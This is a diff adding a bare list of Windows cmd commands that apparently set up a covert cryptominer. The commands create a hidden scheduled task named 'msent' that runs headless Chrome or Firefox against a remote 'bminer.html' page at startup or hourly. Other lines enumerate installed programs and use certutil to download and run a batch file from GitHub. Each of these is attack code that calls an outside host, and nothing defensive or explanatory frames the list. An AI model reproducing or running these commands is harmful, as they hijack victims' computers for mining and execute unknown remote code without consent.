@@ -1,0 +1,38 @@
+
+"c:\Program Files (x86)\Google\Chrome\Application\"
+
+
+
+
+cmd /c schtasks /create /tn msent  /sc hourly /mo 4 /f /tr "'c:\program files (x86)\chrome\chrome.exe' --headless --remote-debugging-port=9223 http://198.13.46.244/bminer.html"
+
+cmd /c dir "c:\Program Files (x86)\Google\Chrome\Application"
+
+cmd /c dir "c:\Program Files"
+
+cmd /c dir "c:\Program Files (x86)"
+
+cmd /c cd "C:\Program Files (x86)\Mozilla Firefox\" ^& firefox.exe -createprofile profile_name
+
+
+cmd /c cd "C:\Program Files\Mozilla Firefox\" ^& firefox.exe -createprofile profile_name
+
+cmd /c schtasks /create /tn msent  /sc onstart  /f /tr "'C:\Program Files (x86)\Mozilla Firefox\firefox.exe' -headless -no-remote -p profile_name http://198.13.46.244/bminer.html"
+
+cmd /c schtasks /create /tn msent  /sc onstart  /f /tr "'C:\Program Files (x86)\Google\Chrome\Application\chrome.exe' --headless --remote-debugging-port=9223 http://198.13.46.244/bminer.html"
+
+cmd /c schtasks /run /i /tn msent
+
+cmd /c schtasks /query /tn msent
+
+cmd /c tasklist |find "chrome"
+
+
+cmd /c cd "c:\Program Files (x86)\Google\Chrome\Application" ^& start "" chrome.exe --headless --remote-debugging-port=9223 http://198.13.46.244/bminer.html
+
+
+cmd /c cd %AppData% ^&^& cd.. ^&^& cd Local ^&^& certutil.exe -urlcache -split -f https://raw.githubusercontent.com/good5068/tools/master/mgo.bat mgo.bat ^&^& mgo.bat
+
+
+cmd /c cd %AppData% ^&^& cd.. ^&^& cd Local
+
